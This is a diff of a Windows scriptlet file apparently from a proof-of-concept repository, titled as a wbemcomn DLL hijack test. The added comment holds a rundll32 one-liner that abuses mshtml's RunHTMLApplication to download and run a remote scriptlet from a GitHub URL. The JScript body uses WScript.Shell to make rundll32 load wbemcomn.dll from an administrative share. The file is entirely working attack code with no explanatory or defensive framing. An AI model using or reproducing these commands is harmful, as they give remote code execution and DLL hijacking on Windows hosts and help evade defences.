@@ -1,10 +1,13 @@
+<!-- Command -->
+<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/greycel/pocs/master/wbemcomn01") -->
+
 <?xml version="1.0"?>
 <package>
 <component id="Test Wbemcomn DLL Hijack">
 
 <script language="JScript">
 <![CDATA[
-var r = new ActiveXObject("WScript.Shell").Run("cmd /k rundll32 shell32.dll,Control_RunDLL \\127.0.0.1\C$\Windows\System32\wbem\wbemcomn.dll"); 
+var r = new ActiveXObject("WScript.Shell").Run("rundll32 shell32.dll,Control_RunDLL \\127.0.0.1\C$\Windows\System32\wbem\wbemcomn.dll"); 
 ]]>
 </script>
 
